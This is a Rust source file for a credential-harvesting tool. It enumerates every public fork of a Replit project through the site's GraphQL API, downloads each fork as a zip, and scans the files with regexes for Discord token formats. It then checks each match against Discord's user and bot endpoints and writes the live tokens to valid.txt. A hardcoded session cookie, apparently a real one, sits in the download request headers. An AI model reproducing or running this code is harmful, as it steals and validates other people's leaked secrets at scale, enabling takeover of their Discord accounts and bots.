#![allow(non_snake_case)]
use regex::Regex;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::{json};
use tokio::fs::{metadata, self};
use std::{sync::Arc};
use zip_extract::extract;
use std::path::PathBuf;
use tokio::time::{sleep, Duration};
use std::io::Cursor;
use walkdir::{DirEntry, WalkDir};
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;



const GRAPHQL: &str = "https://replit.com/graphql";


// For get ids

#[derive(Deserialize, Debug)]
struct Startid {
    start: Data
}
#[derive(Deserialize, Debug)]
struct Data {
    data: Repl
}
#[derive(Deserialize, Debug)]
struct Repl {
    repl: Id
}
#[derive(Deserialize, Debug)]
struct Id {
    id: String,
}



// For get forks

#[derive(Deserialize, Debug)]
struct StartFork {
    start: Data2
}

#[derive(Deserialize, Debug)]
struct Data2 {
    data: Repl2
}

#[derive(Deserialize, Debug)]
struct Repl2 {
    repl: PublicForks
}

#[derive(Deserialize, Debug)]
struct PublicForks {
    publicForks: Items,
    publicForkCount: usize
}

#[derive(Deserialize, Debug)]
struct Items {
    items: Vec<MainArray>
}

#[derive(Deserialize, Debug)]
struct MainArray {
    url: String,
    id: String
}




// For ratelimits
#[derive(Serialize, Deserialize, Debug)]
struct Retry {
    global: bool,
    message: String,
    retry_after: f32
}

#[derive(Clone)]
pub struct Replit {
    url: String,
}

fn is_hidden(entry: &DirEntry) -> bool {

    entry.file_name()
        .to_str()
        .map(|s| s.starts_with('.'))
        .unwrap_or(false)

}

impl Replit {
    pub fn new(url: &str) -> Self {
        Self {url: url.to_string()}
    }

    pub async fn get_id(&self) -> String {
        let json = json!([
            {
                "operationName":"ReplView",
                "variables":{
                    "url":&self.url
                },
                "query":"query ReplView($url: String!) {\n  repl(url: $url) {\n    ... on Repl {\n      id\n      imageUrl\n      ...ReplViewRepl\n      __typename\n    }\n    __typename\n  }\n  currentUser {\n    id\n    ...ReplViewCurrentUser\n    __typename\n  }\n}\n\nfragment ReplViewRepl on Repl {\n  id\n  title\n  timeCreated\n  imageUrl\n  publicReleasesForkCount\n  publicForkCount\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  relatedRepls(limitPerGroup: 3) {\n    name\n    repls {\n      id\n      publishedAs\n      ...ReplLinkRepl\n      ...TemplateReplCardRepl\n      ...ReplPostReplCardRepl\n      __typename\n    }\n    __typename\n  }\n  lang {\n    id\n    displayName\n    __typename\n  }\n  currentUserPermissions {\n    containerWrite\n    publish\n    changeIconUrl\n    __typename\n  }\n  publishedAs\n  deployment {\n    id\n    activeRelease {\n      id\n      timeCreated\n      __typename\n    }\n    __typename\n  }\n  ...ReplViewReplTitleRepl\n  ...ReplViewReplViewerRepl\n  ...ReplLinkRepl\n  ...ReplViewFooterRepl\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment TemplateReplCardRepl on Repl {\n  id\n  iconUrl\n  templateCategory\n  title\n  description(plainText: true)\n  publicReleasesForkCount\n  templateLabel\n  likeCount\n  url\n  owner {\n    ... on User {\n      id\n      ...TemplateReplCardFooterUser\n      __typename\n    }\n    ... on Team {\n      id\n      ...TemplateReplCardFooterTeam\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment TemplateReplCardFooterUser on User {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment TemplateReplCardFooterTeam on Team {\n  id\n  username\n  image\n  url\n  __typename\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n\nfragment ReplViewReplTitleRepl on Repl {\n  id\n  title\n  iconUrl\n  templateInfo {\n    iconUrl\n    __typename\n  }\n  owner {\n    ... on User {\n      id\n      username\n      __typename\n    }\n    ... on Team {\n      id\n      username\n      __typename\n    }\n    __typename\n  }\n  ...ReplViewReplActionsPermissions\n  __typename\n}\n\nfragment ReplViewReplActionsPermissions on Repl {\n  id\n  lastPublishedAt\n  publishedAs\n  templateReview {\n    id\n    promoted\n    __typename\n  }\n  currentUserPermissions {\n    publish\n    __typename\n  }\n  ...UnpublishReplRepl\n  __typename\n}\n\nfragment UnpublishReplRepl on Repl {\n  id\n  commentCount\n  likeCount\n  runCount\n  publishedAs\n  __typename\n}\n\nfragment ReplViewReplViewerRepl on Repl {\n  id\n  publishedAs\n  runCount\n  publicForkCount\n  publicReleasesForkCount\n  prodUrl: hostedUrl(dotty: true)\n  isProject\n  nextPagePathname\n  lang {\n    id\n    header\n    displayName\n    __typename\n  }\n  ...ReplViewerOutputOverlayRepl\n  ...UseReplViewerRepl\n  ...LikeButtonRepl\n  __typename\n}\n\nfragment ReplViewerOutputOverlayRepl on Repl {\n  id\n  title\n  imageUrl\n  lastPublishedAt\n  currentUserPermissions {\n    changeImageUrl\n    __typename\n  }\n  __typename\n}\n\nfragment UseReplViewerRepl on Repl {\n  id\n  previewUrl: hostedUrl(dotty: false, dev: false)\n  url\n  wasPosted\n  wasPublished\n  publishedAs\n  isProject\n  lang {\n    id\n    canUseShellRunner\n    hasReplboxWebview\n    __typename\n  }\n  config {\n    isServer\n    isVnc\n    __typename\n  }\n  deployment {\n    id\n    activeRelease {\n      id\n      previewUrl: hostedUrl\n      __typename\n    }\n    __typename\n  }\n  replViewSettings {\n    id\n    defaultView\n    replFile\n    __typename\n  }\n  ...CrosisContextRepl\n  __typename\n}\n\nfragment CrosisContextRepl on Repl {\n  id\n  language\n  slug\n  user {\n    id\n    username\n    __typename\n  }\n  currentUserPermissions {\n    containerWrite\n    __typename\n  }\n  flagOwnerDotReplitPackager: gateOnOwner(feature: \"flag-dotreplit-packager\")\n  __typename\n}\n\nfragment LikeButtonRepl on Repl {\n  id\n  currentUserDidLike\n  likeCount\n  url\n  wasPosted\n  wasPublished\n  __typename\n}\n\nfragment ReplViewFooterRepl on Repl {\n  id\n  description\n  lastPublishedAt\n  publishedAs\n  deployment {\n    id\n    activeRelease {\n      id\n      timeCreated\n      __typename\n    }\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      followerCount\n      isFollowedByCurrentUser\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      followerCount\n      isFollowedByCurrentUser\n      __typename\n    }\n    __typename\n  }\n  source {\n    release {\n      id\n      __typename\n    }\n    deployment {\n      id\n      repl {\n        id\n        ...ReplViewSourceRepl\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  tags {\n    id\n    __typename\n  }\n  origin {\n    id\n    ...ReplViewSourceRepl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewSourceRepl on Repl {\n  id\n  iconUrl\n  title\n  templateLabel\n  ...ReplLinkRepl\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplViewCurrentUser on CurrentUser {\n  id\n  username\n  isSubscribed\n  isModerator: hasRole(role: MODERATOR)\n  isAdmin: hasRole(role: ADMIN)\n  ...ReplViewReplViewerCurrentUser\n  __typename\n}\n\nfragment ReplViewReplViewerCurrentUser on CurrentUser {\n  id\n  ...LikeButtonCurrentUser\n  ...CrosisContextCurrentUser\n  __typename\n}\n\nfragment LikeButtonCurrentUser on CurrentUser {\n  id\n  isVerified\n  __typename\n}\n\nfragment CrosisContextCurrentUser on CurrentUser {\n  id\n  username\n  isSubscribed\n  flagTrackOtClientDataLoss: gate(feature: \"flag-ot-data-loss-client-tracking\")\n  flagPid1Ping: gate(feature: \"flag-pid1-ping-sample\")\n  flagNoPongReconnect: gate(feature: \"flag-no-pong-reconnect\")\n  __typename\n}\n"
            }
        ]);
        let client = Client::new();
        let resp = client.post(GRAPHQL)
        .header("host", "replit.com")
        .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
        .header("origin", "https://replit.com")
        .header("connection", "keep-alive")
        .header("x-requested-with", "XMLHttpRequest")
        .json(&json)
        .send().await;
        match resp {
            Ok(resp) => resp.json::<Startid>().await.unwrap().start.data.repl.id,
            Err(e) => panic!("Could not get Repl ID: {e}")
        }


    }


    pub async fn get_forks(&self, id: &str) -> (Vec<String>, Vec<String>) {
        let json = json!([
            {
                "operationName":"ReplViewForks",
                "variables":{
                    "replId": id,
                    "count":500
                },
                "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
            }
        ]);
        let client = Client::new();
        let resp = client.post(GRAPHQL)
        .header("host", "replit.com")
        .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
        .header("origin", "https://replit.com")
        .header("connection", "keep-alive")
        .header("x-requested-with", "XMLHttpRequest")
        .json(&json)
        .send().await.unwrap();

        let repl = resp.json::<StartFork>().await.unwrap().start.data.repl;
        let count = repl.publicForkCount;
        println!("\x1b[0;32mFound {count} forks...\x1b[0m");
        let forks = repl.publicForks.items;
        let mut urls: Vec<String> = vec!();
        let mut ids: Vec<String> = vec!();
        for fork in forks {
            urls.push(fork.url);
            ids.push(fork.id);
        }
        loop {
            if urls.len() >= count {
                break;
            } else {

                let json2 = json!([
                    {
                    "operationName":"ReplViewForks",
                        "variables":{
                            "replId": id,
                            "count":500,
                            "after": ids.last().unwrap()
                        },
                    "query":"query ReplViewForks($replId: String!, $count: Int!, $after: String) {\n  repl(id: $replId) {\n    ... on Repl {\n      id\n      publicForkCount\n      publicReleasesForkCount\n      publicForks(count: $count, after: $after) {\n        items {\n          id\n          ...ReplPostReplCardRepl\n          __typename\n        }\n        pageInfo {\n          nextCursor\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReplPostReplCardRepl on Repl {\n  id\n  iconUrl\n  description(plainText: true)\n  ...ReplPostReplInfoRepl\n  ...ReplStatsRepl\n  ...ReplLinkRepl\n  tags {\n    id\n    ...PostsFeedNavTag\n    __typename\n  }\n  owner {\n    ... on Team {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    ... on User {\n      id\n      username\n      url\n      image\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment ReplPostReplInfoRepl on Repl {\n  id\n  title\n  description(plainText: true)\n  imageUrl\n  iconUrl\n  templateInfo {\n    label\n    iconUrl\n    __typename\n  }\n  __typename\n}\n\nfragment ReplStatsRepl on Repl {\n  id\n  likeCount\n  runCount\n  commentCount\n  __typename\n}\n\nfragment ReplLinkRepl on Repl {\n  id\n  url\n  nextPagePathname\n  __typename\n}\n\nfragment PostsFeedNavTag on Tag {\n  id\n  isOfficial\n  __typename\n}\n"
                    }
                ]);
                let resp = client.post(GRAPHQL)
                .header("host", "replit.com")
                .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0")
                .header("origin", "https://replit.com")
                .header("connection", "keep-alive")
                .header("x-requested-with", "XMLHttpRequest")
                .json(&json2)
                .send().await.unwrap();
                let repl = resp.json::<StartFork>().await.unwrap().start.data.repl;

                println!("\x1b[0;32m{} forks loaded...\x1b[0m", urls.len());
                let forks = repl.publicForks.items;
        
                if !forks.is_empty() {
                    for fork in forks {
                        urls.push(fork.url);
                        ids.push(fork.id);
                    }
                } else {
                    break;
                }
            }
        }



        (urls, ids)

    }



    pub async fn get_zip(self, client: Arc<Client>, url: String, count: u32) -> Option<Vec<u8>> {
        let url = format!("https://replit.com{url}.zip");
        println!("\x1b[0;32mStarted downloading fork {}...\x1b[0m", &count);
        let src: Vec<u8>;
        loop {
            let resp = client.get(&url)
            .header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
            .header("accept-encoding", "gzip, deflate, br")
            .header("accept-language", "en-GB,en-US;q=0.9,en;q=0.8")
            .header("sec-ch-ua", r#""Chromium";v="102", "Not A;Brand";v="99""#)
            .header("sec-ch-ua-mobile", "?0")
            .header("sec-ch-ua-platform", r#""Linux""#)
            .header("sec-fetch-dest", "document")
            .header("sec-fetch-mode", "navigate")
            .header("sec-fetch-site", "none")
            .header("sec-fetch-user", "?1")
            .header("service-worker-navigation-preload", "true")
            .header("upgrade-insecure-requests", "1")
            .header("cookie", "__stripe_mid=6b01b6ed-256d-495a-aca8-dd68f98fc9ca21169a; _ga=GA1.2.1243856305.1648378772; hubspotutk=b9dfe9ccc62bcc6659a535eda8a6ca1e; _anon_id=7300c6b8-7bae-4e1e-a15b-2a4047274bd3; connect.sid=s%3A6LRDoSdkMScBUxzuZoBPqjEt6kckQuvw.g2K3xWy1mGzdUwBi669kmf%2F05XQEVN0WS%2F7qAqVm9Rk; __hstc=205638156.b9dfe9ccc62bcc6659a535eda8a6ca1e.1648379787477.1659889475635.1662832129098.4; ajs_user_id=9914868; ajs_anonymous_id=ef4fefba-2f0a-4b12-9a20-e9067b0d5552; replit_ng=1663167550.58.41.725703|8035451343a2d8f3e54599c71b2aec19; replit:authed=1; replit_authed=1; _gid=GA1.2.406234258.1663167554; amplitudeSessionId=1663167554; sidebarClosed=true; _gat=1; __stripe_sid=cd50a6e5-b2d1-496c-85a5-e9d225ef87d963cd4d; _dd_s=logs=1&id=2e1a650d-d3d8-459b-87ee-b695ce1d32d9&created=1663167554666&expire=1663168491454&rum=0")
            .header("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.115 Safari/537.36")
            .send().await;
            match resp {
                Ok(resp) => {
                    if resp.status().is_success() {
                        match resp.bytes().await {
                            Ok(bytes) => {
                                src = bytes.to_vec();
                                println!("\x1b[0;32mFinished downloading fork {}...\x1b[0m", &count);
                                return Some(src)
                            } Err(e) => {
                                println!("\x1b[0;31mError: {e}\x1b[0m");
                                return None
                            }
                        }
                    } else if resp.status().as_str() == "429" {
                        match resp.headers().get("retry-after") {
                            Some(retry) => {
                                println!("\x1b[0;31mRatelimited... Waiting for {} seconds\x1b[0m", retry.to_str().unwrap());
                                sleep(Duration::from_secs(retry.to_str().unwrap().to_string().parse::<u64>().unwrap())).await;
                            },
                            None => return None,
                        }
                    } else {
                        println!("\x1b[0;31mFailed to retrieve zip. Error: {}\x1b[0m", resp.status().as_str());
                        return None
                    }
                },
                Err(_) => continue,
            }
        }
    }

    pub async fn search_extract(&self, src: Vec<u8>) -> Vec<String> {
        let other_token_regex = Regex::new(r#"[A-z|0-9]{24}\.[A-z|0-9|\W]{6}\.[A-z|0-9|\W]{38}"#).unwrap();
        let token_regex = Regex::new(r#"[A-z|0-9]{24}\.[A-z|0-9|\W]{6}\.[A-z|0-9|\W]{27}"#).unwrap();
        extract(Cursor::new(src),  &PathBuf::from("./data"), false).unwrap();
        let walker = WalkDir::new("./data").into_iter();
        let mut tokens = Vec::new();
        let mut file_writer = OpenOptions::new()
            .create(true)
            .append(true)
            .open("tokens.txt")
            .await.unwrap();
        for entry in walker.filter_entry(|e| !is_hidden(e)) {
            let path = match &entry.as_ref() {
                Ok(x) => x.path().to_owned(),
                Err(_) => continue,
        };
        let md = metadata(&path).await;
        match md {
            Ok(md) => {
                if md.is_file() {
                    if let Ok(file) = fs::read_to_string(&path).await {
                        for token in token_regex.find_iter(&file) {
                            tokens.push(token.as_str().to_string());
                            file_writer.write_all(format!("{}\n", token.as_str()).as_bytes()).await.unwrap();
                        }
                        for token in other_token_regex.find_iter(&file) {
                            tokens.push(token.as_str().to_string());
                            file_writer.write_all(format!("{}\n", token.as_str()).as_bytes()).await.unwrap();
                        }
                    };
                }
            },
            Err(_) => {
                println!("\x1b[0;31mPath: {path:?} is not a file\x1b[0m");
                continue
            },
        }
    }
        match fs::remove_dir_all("./data").await {
            Ok(_) => {},
            Err(e) => {
                println!("\x1b[0;31mError: {e:?}\x1b[0m");
            }
        };
        match fs::create_dir("./data").await {
            Ok(_) => {},
            Err(e) => {
                println!("\x1b[0;32mError: {e:?}\x1b[0m");
            }
        }
        println!("\x1b[0;32mFinished searching extract...\x1b[0m");
        tokens
    }

    pub async fn self_check_tokens(&self, client: Arc<Client>, token: String) {
        let file_writer = OpenOptions::new()
            .create(true)
            .append(true)
            .open("valid.txt")
            .await;

        match file_writer {
            Ok(file) => {
                let mut file = file;
                loop {
                    let resp = client.get("https://discord.com/api/v9/users/@me/library")
                        .header("authorization", token.clone())
                        .send().await;
                    match resp {
                        Ok(resp) => {
                            if resp.status().is_success() {
                                file.write_all(format!("{}\n", token.clone()).as_bytes()).await.expect("Failed to write file");
                                println!("\x1b[0;32mUser Token: {} is valid!\x1b[0m", &token);
                                break
                            } else if resp.status().as_u16() == 429 {
                                let j = resp.json::<Retry>().await.unwrap();
                                println!("\x1b[0;31mRatelimited... Please wait {} seconds\x1b[0m", j.retry_after);
                                sleep(Duration::from_secs_f32(j.retry_after)).await;
                            } else if resp.status().is_client_error() {
                                println!("\x1b[0;31mUser Token: {} is invalid!\x1b[0m", &token);
                                break
                            }
                        },
                        Err(e) => {println!("\x1b[0;31mError has occurred\nError: {e}\x1b[0m"); break},
                    }
                }
            },
            Err(e) => println!("\x1b[0;31mError: {e}\x1b[0m")
        }


    }

    pub async fn bot_check_tokens(&self, client: Arc<Client>, token: String) {
        let file_writer = OpenOptions::new()
            .create(true)
            .append(true)
            .open("valid.txt")
            .await;

        match file_writer {
            Ok(file) => {
                let mut file = file;
                loop {
                    let resp = client.get("https://canary.discordapp.com/api/v9/users/@me")
                        .header("authorization", format!("Bot {}",token.clone()))
                        .send().await;
                    match resp {
                        Ok(resp) => {
                            if resp.status().is_success() {
                                file.write_all(format!("{}\n", token.clone()).as_bytes()).await.expect("Failed to write file");
                                println!("\x1b[0;32mBot Token: {} is valid!\x1b[0m", &token);
                                break
                            } else if resp.status().as_u16() == 429 {
                                let j = resp.json::<Retry>().await.unwrap();
                                println!("\x1b[0;31mRatelimited... Please wait {} seconds\x1b[0m", j.retry_after);
                                sleep(Duration::from_secs_f32(j.retry_after)).await;
                            } else if resp.status().is_client_error() {
                                println!("\x1b[0;31mBot Token: {} is invalid!\x1b[0m", &token);
                                break
                            }
                        },
                        Err(e) => {println!("\x1b[0;31mError has occurred\nError: {e}\x1b[0m"); break},
                    }
                }
            },
            Err(e) => println!("\x1b[0;31mError: {e}\x1b[0m")
        }
    }
}

